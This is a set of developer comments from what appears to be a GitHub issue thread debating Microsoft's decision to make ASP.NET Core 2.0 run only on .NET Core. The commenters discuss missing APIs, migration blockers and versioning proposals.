815	"@davidfowl I've just stumbled over this news and it's a bit scary. Until now, I was confident that if I supported comaptiblity with .NETStandard 2.0, I could eventually switch to using ASP.NET Core 2.0 in my application while still running on the full framework. Unless I'm completely missing the point, that's no longer going to be possible.

I've just run the latest version of the API analyzer and there is a number of missing APIs in .NET Standard 2.0 which I depend on. Some of them I can get rid of (e.g. System.Configuration) even if it's a pain. 

Others, I don't know yet. For instance, I use runtime code generation and rely on System.Reflection.Emit.ILGenerator, TypeBuilder, etc. And I can't just get rid of those, it's an core part of the product.

I've dug around further with the API Analyzer and it seems that some of that is covered by .NET Core 2.0 + Extensions but there's still the following APIs missing:
M:System.AppDomain.DefineDynamicAssembly(System.Reflection.AssemblyName,System.Reflection.Emit.AssemblyBuilderAccess,System.Collections.Generic.IEnumerable{System.Reflection.Emit.CustomAttributeBuilder})
M:System.AppDomain.DefineDynamicAssembly(System.Reflection.AssemblyName,System.Reflection.Emit.AssemblyBuilderAccess,System.String)
M:System.AppDomain.DefineDynamicAssembly(System.Reflection.AssemblyName,System.Reflection.Emit.AssemblyBuilderAccess,System.String,System.Boolean,System.Collections.Generic.IEnumerable{System.Reflection.Emit.CustomAttributeBuilder})
M:System.Reflection.Emit.AssemblyBuilder.DefineDynamicModule(System.String,System.Boolean)
M:System.Reflection.Emit.AssemblyBuilder.DefineDynamicModule(System.String,System.String,System.Boolean)
M:System.Reflection.Emit.AssemblyBuilder.DefineVersionInfoResource
M:System.Reflection.Emit.AssemblyBuilder.Save(System.String)
M:System.Reflection.Emit.AssemblyBuilder.Save(System.String,System.Reflection.PortableExecutableKinds,System.Reflection.ImageFileMachine)
M:System.Reflection.Emit.ILGenerator.MarkSequencePoint(System.Diagnostics.SymbolStore.ISymbolDocumentWriter,System.Int32,System.Int32,System.Int32,System.Int32)
M:System.Reflection.Emit.LocalBuilder.SetLocalSymInfo(System.String)
M:System.Reflection.Emit.ModuleBuilder.DefineDocument(System.String,System.Guid,System.Guid,System.Guid)
M:System.Reflection.Emit.TypeBuilder.CreateType

I have looked around a bit in https://apisof.net/catalog and it seems that the information there differs from the API analyzer output, i.e. some APIs the analyzer marks as not supported are listed there (TypeBuilder.CreateType). So, I might be okay, but I won't know until I try. Other's, they are defintely missing, e.g. the AssemblyBuilder.Save(...)

So, bottom line: I won't just be able to drop in ASP.NET Core 2.0 into the full framework stack and just keep my old dependencies. I will also not be able to use .NET Standard 2.0. Instead, I will have to port everything Big Bang to ASP.NET Core 2.0, since that's the only API which covers almost everything I need. AND I won't be able to develop the new web application layer on ASP.NET Core 2.0 BEFORE I migrate. So, it's actually a Big Bang followed by a REALLY Big Bang."
816	"@davidfowl thanks for the details.

I'm completely all for .NET Core and I actually don't care much about .NET Full Framework... But I cared about `netstandard2.0` only because it was bringing most of the .NET full framework API, and the version `2.0` as a ""junction"" version, i.e., to help people migrating their code from .NET Full to .NET Core... but I was not really expecting it to be tied to the slow evolving path of the full framework forever... but it sounds like `netstandard2.0` is going to be the new PCL after all... 

so fair enough, the .NET full framework really need a retirement plan now (`System.Drawing` holding you back? Come one, `SkiaSharp` is wait better and cross platform) and let .NET Core 2.0 evolve has its own full pace!
"
817	"@davidfowl Initially, API wise ,Net Core was supposed to be a subset of Full Framework running on all platforms, and any API changes concerning Core to be brought on both. That was the initial promise at least ... things look very different now with this new (out of nowhere) direction.

The things you've mentioned are all great, I'd love to have them right now, but on Full Framework where they are greatly needed, I currently work on a WPF app where Span<T> and related APIs would be a godsend, we currently have custom TryParse routines , for datetime and timespans and primitive taking indexes that are a support nightmare because they need to be culture aware..

It's totally understandable you want to evolve the framework, what is not understandable is why create this split with existing customers and leave them stranded on a now dying platform? Full framework?
"
818	@popcatalin81 (Before things get too off-topic, but at the risk of being a mansplainer) - Span<T> is about moving memory around without allocations, it has nothing to do with DateTime.
819	@popcatalin81 with `netstandard2.0` I'm pretty sure that we could expect even `WPF` and `System.Drawing` to run on .NET Core (Windows only, they would obviously not run on non-Windows platform... ), afaik, these libraries are not using any CLR special features... they would just need to be recompiled with `netstandard2.0`... (only the .NET part, the native part would be the same - wpf composition engine, or direct calls to Win32 functions for System.Drawing...)
820	"I've not been following the whole ""Core"" journey as closely as perhaps I should have and as such there are a couple things that really stand out for me.

It seemed that in the beginning the ASP.NET team were charging ahead of everyone else (or at least were being accused of that), were then reigned back in and are now having to break free again for reasons already mentioned. Is that a fair assessment?

If so, it would seem that a lot of the difficulties now being faced were foreseeable and that a new modern ASP.NET / .NET should've been a standalone thing from the get go. 

The primary issue that I'm seeing throughout this thread is that people have have made significant investments based on promises and assumptions that no longer hold true. 

It feels like a lot of this could've been avoided.

Am I way off base?"
821	"@davidfowl @DamianEdwards @shanselman 

I've got some a few ASP.NET Core 1.x apps in production that target `net462` because they provide the functionality and use the namespaces below. I can't see the namespaces in the [netstandard2.0 work in progress API reference](https://github.com/dotnet/standard/blob/master/docs/versions/netstandard2.0.md).

**1. ADFS integration:**

• System.IdentityModel.Protocols.WSTrust
• System.IdentityModel.Tokens
• System.ServiceModel
• System.ServiceModel.Security

**2. Atom / RSS feed generation:**

• System.ServiceModel.Syndication

I'd like to get these existing apps targeting `netcoreapp2.0` in the future. What would be my best course of action in each case? For example, have I missed an existing NuGet package or should I wait for a future release?"
822	"There are lots of things that force me into full stack, ironically most of them Microsoft technologies. CRM Dynamics SDK, Azure SDKs, XLST namespace support, headless ADAL login (only available in full stack),etc... 

This change will only further segregate an already tiny developer base brave/stupid enough to early adopt .Net Core ."
823	" @davidfowl 
> We're doing HTTP2 support next and it requires new APIs.

I only partly understand that point. For HTTP/2 the main blocker is ALPN support for TLS, so we can't have it right now. However this will also not happen in time for .NET Core 2.0, according to the comments on the associated request in the CoreFx repo. Only later on (2.2? 3.0?) Which means from a HTTP/2 perspective it wouldn't matter if ASP.NET Core depends on corefx 2.0 or .netstandard 2.0 - it wouldn't work anyway. Only later on, when the version number gets increased again.

Besides that the HTTP/2 issue mainly affects the webserver (Kestrel) and not the whole framework. Besides the ""it's ugly to maintain multiple things"" reason I see no reason why one couldn't have a webserver without HTTP/2 support for .NET standard and one with it for future .NET Core versions."
824	"@davidfowl There is one thing that has not really been covered in this whole discussion. I fully understand the technical background, and I entirely agree with your reasoning. In particular, I agree that staying on 1.x (potentially with an extended support timeframe), especially if currently missing pain points like SignalR will be added with 1.x support in the future, is going to be a solution that is technically feasible for the majority of all cases discussed here.

The problem however is not of technical nature, it's psychological. As some here have pointed out, adoption of ASP.NET Core still is in its early stages. Think about the message you are about to send: you are going to release a 2.x version soon and then most likely immediately start strategic planning on version 3.x, all in the plain open (which normally is a good thing). A consequence of that will be, that even if there is no mandatory requirement for most people to use 2.x, and even though you might provide a reasonable technical solution by supporting 1.x, in people's heads the idea of actively migrating an existing solution to ""a version 1"" when there's already work on version 3 will be an instant and unacceptable psychological roadblock. There's real danger that this will result in a chicken/egg problem where people don't migrate existing projects to ASP.NET Core and library authors don't port their stuff to .NET Core because there's not enough demand and pressure, which will effectively slow down adoption rate even more, for a potentally long time.

As some have also mentioned: apparently a lot of people, even if they were aware of this move coming at some point, didn't expect this cut to happen so soon. Additionally, over the course of the last months we heard and read a lot of talks, interviews and posts about how 2.x (.NET Core, .NET Standard etc.) is going to stabilize and unify things. Hence, in a lot of minds ""2.x"" has become the equivalent for ""mature"", no matter how technically well-founded this claim may or may not be. The way you built up excitement for 2.x, and now take away a core feature of 1.x on short notice, was a most unfortunate move, which most likely has moved the argument away from technical reasoning to an emotional one, even if on the surface it still seems we are just discussing technical details here. It is going to become very hard for you to change this perception back and re-establish broad trust and confidence in 1.x being a solid migration target to ASP.NET Core.

My personal recommendation would be to release 2.0 as the last major release to support the .NET Framework, but instead of taking another year or more to drop that support, move on to 3.x much quicker. Use 3.x for all these technical features that are not possible with backwards compatibility in mind, and start working on 3.x as soon as 2.0 is out of the door. By that you get multiple benefits at once: you can keep your original support plan for 1.x. People get .NET support in 2.x, which in their heads has built up as ""the mature"" version over the last months. They can migrate to the ""latest and greatest"" with confidence, now very aware of the fact that 3.x will drop that support, and enough time to plan their migration strategies, if necessary. And you do not need to slow down (or only for a very short time) with adding new features and evolving ASP.NET Core as rapidly as you want.

Again, that proposal is not so much different from what you currently indend to do anyway, just with some different versioning ninjutsu applied. The fact that this change has been applied recently implies that technically this would only be a small step backwards until you are able to again move forward full-throttle, but it would dodge these psychological problems nicely.

/cc @DamianEdwards @shanselman 
"
825	"and announce Microsoft Shrink at build. (sorry, I couldn't resist)
While I agree with @MisterGoodcat in everything about the WHY, I'm wondering, do we really need Microsoft to manage our emotional flaws/needs?"
826	".NET Framework has been stable but slow-moving for years, and as a maintainer of almost every kind of .NET app, I agree that something has to be done about it, and maybe even that ""put it out of its misery"" is an option in the fullness of time, now that Microsoft has chosen to anoint .NET Core instead of other options. But this issue illustrates how blind Microsoft tends to be that past effort spent does not all automatically port over. 

For a company famous for its focus on developers and developer tools, Microsoft asking for blockers only in the form of its own dependencies is incredibly myopic. It doesn't surprise me that DirectoryServices and Drawing are the single most popular blockers, but that does not mean there's not the mother of all long tails of internal components, third party components and COM Interop that are either impossible, impractical or enormously expensive (especially in the form of upgrades) to bring along for the ride.

I understand the argument that Microsoft is asking about its own stuff from the BCL or extended .NET Framework (WCF, etc) in order to make sure they're working on the right stuff themselves, but the same question should not be driving decisions that move the entire platform. If the plan was to drop .NET Framework all along at some stage, why not communicate it? And if the decision was made recently, why not communicate that at that time? Why not talk to us and consult with us? I understand that not every one of us will give qualified analyses, but when I see MVPs in this thread, your most fervent supporters and most active users being blindsided by this, I'm not really confident that Microsoft cares the least bit about its customers.

And I also understand the argument that it's easy for me to say ""Microsoft"". I know that it's made up of individual people who do not have infinite capacity. But I don't ask for herculean efforts from a steely monolith - I ask for communication, honesty, respect. I ask that when you all that work on this product and want to make changes that will affect your customers, you engage with your community instead of rolling the dice. We write articles for you, we choose your platform, we pump it when you do something right (like letting people know about the whole performance boost, which Ben Adams, an unpaid community member, made indelible contributions to), we watch community standups. But this goes both ways. Use us as more than a megaphone, and we may not react in this way."
827	"@Bartmax It's either that or give everyone a mandatory 2 hour course in the differences of core, asp.net core, asp.net core non-core, netstandardbanana, .net, system.web. asp.net 5 (I mean 6).
And start communicating roadmaps and intentions more clearly.

It's still not a fix for those who can never let go of full framework. Somewhere down the road we will end up with two communities.

In a perfect world asp.net core would be faster on core, and maybe even have some exclusive features not available for .net. But most of the stuff would be netstandard, and everything else would be cross compile at least for the foresable future. And people can learn core, since if they have to work on a legacy project the only difference would be the bootstrapping part, instead of the whole asp.net part."
828	Not seeing how anyone is a normal asp.net developer shop can have confidence in this moving forward.
829	"As someone who is has to use quite a few C++/CLI libraries this potential change leaves me with gruesome options:

1) Stay with the current stable asp.net core version forever without ever having the chance of leveraging new features or security fixes.

2) Invest a boatload of time (and ultimately money) of replacing all those C++/CLI libs, which no customer would ever want to pay a single cent for.

3) Abandon asp.net core altogether

I can understand that this change is necessary in the future and I'm all for it. What i cannot understand and accept is the timeframe. Something of this magnitude is something you would announce as a roadmap goal a year in advanced as an upcoming breaking change in the version 3.x or even 4.x and not dump it in the next version....

"
830	"> @davidfowl What about something like edge.js for netcore? It makes the API consumer responsible for platform checks and a strongly typed interface between netfx and netcore is sufficient for most scenarios.

To me, this looks like an ideal solution:

1) No guesswork whether your netfx code will run under netcore -- it uses netfx runtime, in-process
2) Doesn't hold back Core
3) If new Core APIs would become popular enough that developers would drop support for the lowest possible version of netstandard, which is not what is happening in the netfx space, you could provide a bridge for the opposite direction"
831	"For those suggesting a dual-platform ASP.NET Core, one which runs on old .NET without any of the shiny new string and span features, and one on .NET Core 2 with those features... well, I'd suggest taking a look through the code. 

At the most basic level, any web framework:
- takes blocks of bytes that represent UTF8-encoded strings (_BOBTRUES_), interprets them and passes them into your code as strongly-typed objects
- takes the results of your code and turns them back into _BOBTRUES_.

So it makes sense that what you really, really need if you're building a web framework is low-level primitives that understand _BOBTRUES_, doesn't it?

And if most of the code you're writing is dependent on _BOBTRUES_, but you also have to support another runtime that has no idea what _BOBTRUES_ are, then you're writing all that code twice, all littered with compiler directives or complicated build files. And you're going to have to keep writing and editing all that code in duplicate, at the same time as trying to make your web framework _awesome_, for as long as it takes not just for full .NET to get round to understanding _BOBTRUES_, but also Mono, UWP, Xamarin, Unity3D, and anything else that implements whatever NETStandard you add _BOBTRUES_ requirements to, many of which don't really care about _BOBTRUES_ in the first place.

Of course, the only reason you're having to write all this code twice is because there are a bunch of 1st-party and 3rd-party packages out there that are either
- System.Drawing, System.DirectoryServices, etc., or
- waiting for NETStandard 2.0 because 1.x is missing APIs they need, or
- maintained by people who don't have time or incentive to migrate to NETStandard
- abandoned, or 
- dependent on upstream packages that are one of the above

Leaving aside the System.* bits, for a lot of the other packages, maybe knowing that ASP.NET Core users can run on full .NET is making putting off the port to NETStandard a bit easier to justify? _""Yeah, we support ASP.NET Core, but only on full .NET for now...""_ For people who need to run .NET Core apps in Linux containers, or want to develop them on Macs, that's just as frustrating, and there's no ""just stay on version X for now"" workaround. There's just no NHibernate, no OData, no EF6, no whatever.

So if this is the kick in the pants that is needed for teams inside and outside of Microsoft to get their packages properly migrated to NETStandard 2.0 so they can be used by _all_ ASP.NET developers*, not just those running on Windows servers on full .NET, then that's a _good thing_.

###### *Remember, ASP.NET Core 2.0 running on .NET Core 2.0 doesn't need to _publish_ NETStandard packages to be able to _consume_ them.
"
832	"The comment directed @JamesNK for writing only a parser is truly classy, especially considering you dropped your own parser for his. Which is he wrote in his own time to move *your* platform forward.

Yes the full stack moves slower, but that also means you have time to get to know the framework. There is still a lot to be done in the normal framework so I don't really see why we need something like .Net core to be honest. If cross platform is a concern, you just bought Xamarin and they run .Net on almost anything. Including a freaking watch.

Maybe a roadmap?"
833	"Dedelerimizin kaynak kodlarını okuyamıyoruz ve algoritmalarını anlayamıyoruz bir gece de cahil kaldık! . 
Asp.net Core gelse ne olacak abi , kılıçdaroğlunda liderlik vasfı yok bi kere."
834	"> So if this is the kick in the pants that is needed for teams inside and outside of Microsoft to get their  packages properly migrated to NETStandard 2.0 so they can be used by all ASP.NET developers*, not just those running on Windows servers on full .NET, then that's a good thing.

@markrendle If library authors followed ASP.NET Core logic, wouldn't they just jump to netcoreapp rather than netstandard? After all they can benefit from the new APIs too? Why bother with netstandard at all? ASP.NET is just another library after all (albeit a largeish one)"
835	My case is exactly the same as mentioned by many others in this thread: My company has a large SaaS-application that relies on a large number of internal and third-party libraries that will probably never be made available for .NET Core. The plan forward  was always to move to ASP.NET Core on the full .NET framework, and then slowly, over 5+ years, find replacements for these third-party components. This (non-)announcement has thrown these plans in complete disarray.
836	"I was under the impression that ASP.NET Core did not run on .NET Desktop framework. *Edit*. The documentation page states that ASP.NET Core runs on the full .NET Framework so it clearly implies support.

There seems to be another option, in case nobody has suggested this already.

After all, ASP.NET Core is open source. This means there could be two different versions of ASP.NET Core:

ASP.NET Core: targets .NET Core (netcoreapp2.0), the existing build
**""ASP.NET Core Standard""**: another build, that targets .NET Standard (netstandard1.* and net4*) and runs on .NET Desktop Framework and other standard platforms as needed.

The Core build would be linked to .NET Core, while the **Core Standard** build will be constrained by what is available on netstandard1.* and net4*, and later .NET standard 2.0+; more slow moving, but more compatible. .NET Core can be better for greenfield and start-ups, and Standard can be great for brownfield, migrations and enterprises.

The path taken by Microsoft team makes sense as the main line option, Core is the future of the framework. Meanwhile, maintaining an additional target for netstandard should be possible to achieve with a minimum of effort. It can be an open-source project. Maybe that can actually be done by Microsoft too, in the spirit of compatibility.

This means that the ""ASP.NET Core Standard"" may not get all new features, but as this branch is for compatibility, the users that use this will have the confidence that they can use all supported features in the standard framework, and that the Standard branch will be available indefinitely on Github, and that volunteers can port fixes and updates from the Core branch to the standard branch.

If it was possible to maintain .NET Desktop framework compatibility in ASP.NET core for so long, then maintaining another build should not be such a big hurdle. Many other .NET projects do the same to multi-target, like protobuf-net, with some conditional compilation statements.

Basically, users that need Active Directory and System.Drawing can use ASP.NET Core Standard, but they will be limited to use Windows. However, their code will be ready to easily port to .NET Core once libraries become available, and at their own pace, with no risk of future lack of support.

I guess the question would be if the team would be able to provide such a branch. For fundamental libraries like ASP.NET, this may be necessary. I think the need to provide a path from .NET Framework to .NET Core will necessitate these types of stop-gap solutions anyway at some point. Software is flexible and this kind of solution will allow for the necessary transition to be smooth.

I think the extra effort of doing this should be seen as a small investment when compared with the significantly larger adoption and better migration it will offer to the community as a whole. Having thousands of more users will certainly help spawn more contributions to the project to offset the work of maintaining two targets."
837	"@bencyoung 

> If library authors followed ASP.NET Core logic, wouldn't they just jump to netcoreapp rather than netstandard? After all they can benefit from the new APIs too? Why bother with netstandard at all? ASP.NET is just another library after all (albeit a largeish one)

Well, if a library author were writing something that benefitted enormously from the new primitives and framework-level support for _BOBTRUES_, then I guess that would probably make sense (and I can totally see a good case for JSON or other serializer libraries that supported those, btw). But if the code in the package doesn't really care about _BOBTRUES_ or any of that stuff then you'd have to be particularly bloody-minded to write `netcoreapp20` when `netstandard20` _would work just as well_."
838	@markrendle So you'd be happy for say Newtonsoft.JSON to do that for its next version, dropping support for any existing version with a year's timescale? You're happy for parsing, IO and high perf libraries to start dropping support for netstandard and .NET Framework?
839	"Suggestion on how to fix this:

1. Make asp.net core 2.x run on .net and move the core-only stuff to version 3.x (backport the user facing features of 2.0 onto 1.x and call it 2.0)
2. Make it clear from the start that asp.net core 2.x will be the last version that works on .net, but give it a long lifetime.
3. Focus on making the tools for validating if a lib works on netstandard2.x better. The current guess work is what's freaking people out.
4. Focus on helping those libs that many use get netstandard2.x/core support. (Even if it's Windows only)
5. Adjust the communication between Microsoft and the community. Yes we want speed/features/etc, but many also need reliability/legacy. We need to find a better middle ground than this."
840	"@vectorix: it was. The very first page on the ASP.NET Core docs, [Introduction to ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/) says:

> ### Next steps
> ...
> An ASP.NET Core app can use the .NET Core or .NET Framework runtime. For more information, see [Choosing between .NET Core and .NET Framework](https://docs.microsoft.com/en-us/dotnet/articles/standard/choosing-core-framework-server).
> ...

It links to a page that quite clearly says you can use .NET Framework (the full one).

For fuck's sake, that comparison page even says this:
> .NET Framework will continue to be the natural choice for many existing scenarios and as such, it won’t be replaced by .NET Core for all server applications."
841	Personally all it would take to make me happy is to say BOBTRUES will be in netstandard x where x doesn't even need to be defined. Otherwise you are saying netstandard is kind of already dead if you care about performance...
842	"5 days later we are about to start BUILD event.

Let's wait and let Microsoft (hopefully) make an announcement and share their vision and roadmaps with everyone"
843	"@CMircea: Thanks for pointing it out. That's indeed obvious. It seems that maintaining compatibility with .NET Desktop Framework would be necessary to follow the letter and spirit of the page.
"
844	"We have just finished a large job for a client that's ASP.NET Core 1.1 on top of .NET462 hosted on Azure. We've had to go this route as they do data refreshes to the site by uploading an MS Access db and we import the data in to Azure SQL. The only way we could do this (and it was a struggle) was to use the full framework. I don't really want to be in a position that I have to tell our client that this solution is only going to be supported for 1, 2, maybe 3 years if we're lucky. Telling them that they need to change their entire process to remove the Access issue isn't an option, I've been trying for years!

If there's a better option for reading an Access db, or it's in a Roadmap somewhere, then I'll be happy. Otherwise, this is concerning."
845	"@bencyoung I think the big difference is that JSON.NET isn't an application, it's a library. I believe the intention is for library authors to target .NET Standard to ensure as broad compatibility as possible, whereas ASP.NET Core is an application model. The question I would have, is how much of ASP.NET Core's layers will be .NET Standard compatible, and what is targeting netcore? I have new code I've been writing against .NET Standard, but has references for aspects of ASP.NET Core layering, but made available as a library. 

That being said, there is nothing stopping library authors from targeting netcore, instead of netstandard, but they risk reducing compatibility across a plethora of potential projects, whereas ASP.NET Core limits the damage to applications running on a (now) specific runtime."
846	@Antaris ASP.NET is a library as far as I know. Kestrel is the application. You can OWIN self host ASP.NET Core in any application you want currently?
847	"@bencyoung Fair point, poor wording on my part.

What I mean to say (if I can find the _right_ way of saying it), is that you use ASP.NET Core (as a stack) in one specific way - to run a web application. You can use a library like JSON.NET in many ways depending on your application model. Thinking about the moving parts of ASP.NET Core, things like Razor will still be built against .NET Standard, and these things generally could be used in other application models. Does that make sense? 

Don't get me wrong, I'm not defending one approach vs. the other, but I benefit from working on a few greenfield projects, instead of integrating/upgrading with legacy codebases contingent on future compatibility with netfx. So I guess in that sense, I can't add much weight around the argument for increased compatibility (ASP.NET Core 2+ on netfx)"
848	@Antaris Thanks, although I'm not sure about that! We self host REST API's in the same process as WCF services for backwards compatibility, inside windows services....
849	"Wow, what a terrible decision by Microsoft.  First, .NET Core was going to be the new .NET, then Microsoft decides, we need to bring back as much of the old APIs as possible.  Now they're leaving the folks behind who trusted Microsoft by starting ASP.NET Core projects with the full framework. I'm losing faith in .NET more and more everyday.  Golang isn't perfect, but it's looking more and more attractive everyday...and if anyone hasn't noticed...it's gaining more and more traction.  I thought Microsoft could capitalize on the Java community's inability to get anything done in short order, but .NET Core has been a complete disappointment and we've more or less been treading water for the past 2 years...and all we've gotten in exchange for it is cross-platform (who cares now that you can run .NET in a container on Windows Nano) and a ton of complexity (ridiculously terrible tooling, no F# support (VS), .NET Standard bingo.)

**Update:** I see a few thumbs downs here, but it's hard to have a meaningful conversation with emojis ;)  What don't you agree with?"
850	"Cross-plattform support is the main reason I switched to ASP.NET Core, and I think that I'm not alone with it. But that's not the only improvement of ASP.NET Core. There is more, like the modulared structure, which is of course highly needed on a framework, that is grown over the years. Buildin DI is also new. 

The possibility to use the old 4.x framework together with ASP.NET core seems a good compromise for me: OS/Linux fans like me are not forced to use windows. But companys who really need Windows (like for AD authentication) can use them. I don't understand why microsoft is breaking this good middle-way. Especially now, when a lot of important namespaces from the old 4.x framework are not ported to ASP.NET Core yet. "
851	@DMWOO7 Please don't confuse .NET Core and ASP.NET Core.
852	"> Please don't confuse .NET Core and ASP.NET Core.

The irony. 😆 "
853	@MartinJohns I updated my post to make it more obvious. 
854	"@bencyoung 

> So you'd be happy for say Newtonsoft.JSON to do that for its next version, dropping support for any existing version with a year's timescale? You're happy for parsing, IO and high perf libraries to start dropping support for netstandard and .NET Framework?

Personally, I'd be fine with that, because I build web applications and services to run on Linux servers in containers, and I don't give a damn about anybody but myself and my own use case, which is why I'm in this thread.

Seriously, though, I wouldn't expect JSON.NET to drop support for `netstandard`, but I wouldn't be at all surprised to see somebody release a Core.Json library that works with the more-optimal-for-web-development `netcore` APIs."
855	Welcome to the Python 3 of .NET. I had a feeling this will happen every since Core was announced years ago.
856	Having ASP.NET Core target netcoreapp2.0 makes the most sense.  .NET Core has provided a fresh start and a way to run applications on multiple platforms. Trying to drag all those APIs created for Windows along is just a train wreck waiting to happen. The Python 3 analogy is good and so is Python 3.
857	"OK, having read the thread I offer a little bit different view, obviously a marginal one: 

- I do not make web sites for living (still studying), from time to time I spin a smaller or bigger web site either for myself or for small companies/organizations. Sometimes, people come and ask for a technological advice.
- I used ASP.NET from the beginning, but I have been mostly ignoring the ""web forms stack"" and directly processing and composing HTML - think Razor Pages.
- Anything web related I ever made was always running on IIS. Cross-platform support is of no interest to me, though I am not offended by it.
- I am too small to care about what is officially supported.
- I generally don't depend on 3rd party libraries.

I would expect that it must have occurred to anyone who is following Microsoft that .NET Core might be getting more resources than .NET Framework and eventually the .NET Framework could end up in a maintenance-only mode. Also while missing APIs are being added, it is pretty clear that there was never the intention to provide feature parity with full .NET Framework.

The fact that ASP.NET Core runs on .NET Framework allowed me to stay at the front of development, maintain relevancy in the industry and have all the cool new things, while still have access to the full feature set of the framework (and the OS). I have tried couple of simple web pages in ASP.NET Core and was planning to start a bigger one too. Actually, I was planning to do all new development in ASP.NET Core on .NET Framework. Well, I guess no more.

Let me answer some of the questions (in no particular order):

- **Why ASP.NET Core 2.x and not 1.x**
Razor Pages definitely. That's the way I work mostly. Stability and what others seem to call ""maturity"" would be another, although it has been suggested that fixes get backported. I would consider tooling to be a big impact if it got split.
That means postponing it to 3.x for me would do the trick.

- **Why ASP.NET Core and not ASP.NET**
Well, in the light of this topic that is a fair question. When you have full .NET Framework, ASP.NET Core by definition adds value to it. Modern stack, tag helpers, unified API and MVC, newest features. Without full .NET Framework, not so much. Indeed, looks like going back to ASP.NET is the best solution for me.

- **New features or compatibility?**
100% new features. BUT, switching strings to UTF-8 (and 4-byte chars!) or architectural refactoring are compatible changes to me. Taking features out is not.

- **What features from .NET Framework I use**
The big ones I am worried about:
1. _System.Windows.Media.Imaging_. Definitely not ~~System.Drawing~. That sounds like counter-everything .NET Core is about. Since this is a long thread, quoting @JimBobSquarePants and @mstum:
> System.Drawing  in particular is both confusing and concerning. I cannot fathom why you would ever want to port that API to .NET Core on any platform. It's difficult to work with, unsupported on the server, and lacks many critical features required for modern development (Multi threading, Pixel Formats, ICC, EXIF, Quantization, Indexed Png and so on).

> Classes within the System.Drawing namespace are not supported for use within a Windows or ASP.NET service. Attempting to use these classes from within one of these application types may produce unexpected problems, such as diminished service performance and run-time exceptions. For a supported alternative, see Windows Imaging Components.

All my web imaging stuff uses WIC. Porting technology that was never supported while not porting the one that has been recommended for years would be a little disappointment (albeit understandable if that's what most customers demand).

2. _System.Windows.Xps_ and _System.Windows.Markup_. I generate all documents (from invoices to shipping labels) in XPS. You get design-time support when creating the documents in XAML and full-featured databinding, XAML layout including text stack, pagination, templates and styling with triggers etc. during generation - pretty cool.
3. _System.Reflection_ for inspecting assemblies, generating documentation etc. and filling in framework gaps.
Others that have been mentioned:
4. _WCF_ and _ServiceModel_, communication with government goes over this
5. _DirectoryServices.Protocols_ and NTLM authentication
6. Spatial types in SQL
7. Cryptography
Others I use but I believe are available: e-mailing, ZIP archiving.

At the end this is totally a business decision. For me, ASP.NET Core without full .NET Framework limits what I can create and I don't have convincing reason to use it at the moment. Happy to re-evaluate if situation changed or my living depended on it.
But I don't think it matters whether I am on the platform or not. It matters whether popular names and big enterprise customers are on. It matters whether the applications created end up in Azure and mine don't. So I guess I need to play along with whatever keeps the framework alive.

Whether this change keeps it alive and competitive is another question. To be fair though, I believe it does, as someone said above, targeting people who don't have .NET Framework background. For others, it's either worth switching or it isn't. And then there are people like me who thought could have the best from both worlds. The decision was abrupt and perhaps even unfair, but that's always the risk when working with the latest technologies in development. Happened with .csproj, now with .NET Framework and I am pretty sure it will happen in the future too.

PS. Pity this ""never communicated"" gap filling role has not been pointed out before. I was supporting the msbuild project system, but had it been clear .NET Framework is out of the plan in few months, I likely wouldn't have such interest in that (or felt I should have a say). I think it's fine to do big decisions, and better late than never, but it would help if the target audience was consistent."
858	"> At the end this is totally a business decision.

The problem is Microsoft is creating uncertainty.  Big business hates uncertainty.  Microsoft used to be the king of compatibility (good or bad, not my call.)  Then .NET Core came about...breaking compatibility...then great news, we're going to add a bunch of the old APIs back...and now we have this ASP.NET Core 2.0 break.

Big business likes boring, reliable tech stacks.  Startups care less, and it seems like Microsoft can't decide which group they're trying to please."
859	@GiorgioG I am not sure I really understand why big business with existing apps would want to switch to ASP.NET Core then. It looks more like a fashion thing or something.
860	"@miloush I think it's more about setting up for the future. If you transition your existing code base slowly to .NET Standard / ASP.NET Core but run it under the full framework you're positioning your code to be compatible with the .NET Core in the future so you don't have to make a huge, all at once, stop everything conversion when support for the old system is dropped.

Now businesses cannot do that because converting them to .NET Standard is not enough, you either have to drink the cool aid completely, or not at all."
861	"@miloush - say they started a project with ASP.NET Core 1.1 on the full framework.  They can never move to ASP.NET Core 2.0 on the full framework.  Is that acceptable?  Sounds pretty awful for anyone in that boat.
"
862	"@miloush Because .Net core is more productive (I don't want to enumerate here all the tech advancements, you know them, merged API/MVC controllers, tag helpers, localization support etc) and because businesse do upgrade. What they don't usually do is big bang upgrades because well they can't afford discontinuity, they usually have to do it in small increments.

Completely different for a startup, who couldn't care less if support for a previous version is dropped. They have no legacy they have no problems of this sort."
863	@popcatalin81 - All this points can be reached with the full framewrok too, one is not in conflict with the other, the problem is the pace of development of one and the other, I see MS to much in a hurry to release a micro-service framework that looks good in the benchmark charts, it looks like it has become an obsession.
864	"Would recommend watching: 

""Three Runtimes, one standard… .NET Standard: All in Visual Studio 2017"" 

With the two Scotts in 45mins at Build https://channel9.msdn.com/ Might mention something?"
865	@adrianlmm Relevant but not strictly related, have we stopped drinking the micro-service koolaid yet?  It adds a ton of complexity (build/deployment/operational/troubleshooting/etc) and most companies don't need them (how many companies need horizontal scalability that warrant the added operational complexities?)  I'm all for bounded contexts, but we don't need 50 micro-services to do that.
866	"@GiorgioG my question was more why would they move to ASP.NET Core 1.1 in the first place. Well I did, and I do feel - not my best day, that's for sure. But I don't have a big codebase I would have to migrate and would wait how things settle a bit before committing larger investments to it. I mean even without any budget I was postponing a development of new bigger website on ASP.NET Core before it gets usable tooling and the future is a bit clear - turned out to be not such a bad decision. (Disclaimer: Again I never had to do this decision with big business codebase or when living off it, so bare with me.)

I am not blaming people jumping on (I did too with smaller things), and I definitely don't want to be defending the other side - I would be thrilled if ASP.NET Core supported .NET Framework forever!

What I don't understand much is how big companies where change and uncertainty is a problem got into the situation, 6 months after RTM and new toolchain requirements."
867	"@miloush We've been ""waiting for .NET Core to settle"" for over a year.  At some point people actually need to start....and deliver projects ;)
"
868	@miloush They wanted to make use of the improvements of ASP.NET Core, but still have to use .NET libraries. And officially it was stated that you could choose between .NET and .NET Core. Now they're suddenly in a very bad situation: They can't upgrade to ASP.NET Core version 2.0, they'll be stuck on version 1.x. And at some point support for 1.x is running out - and new features won't come out for 1.x either.
869	"@GiorgioG , I've used .Net core for a new project so far, and migrated to Asp.Net core on Full Framework another one. Both active projects.

It's not that I don't want to use Net Core everywhere,I DO, but as a matter of fact that I CAN'T  use it everywhere yet! That's the issue. We should leave wishful thinking aside and think of the real world first of all ... "
870	@MartinJohns I got that, I am in the very same situation.
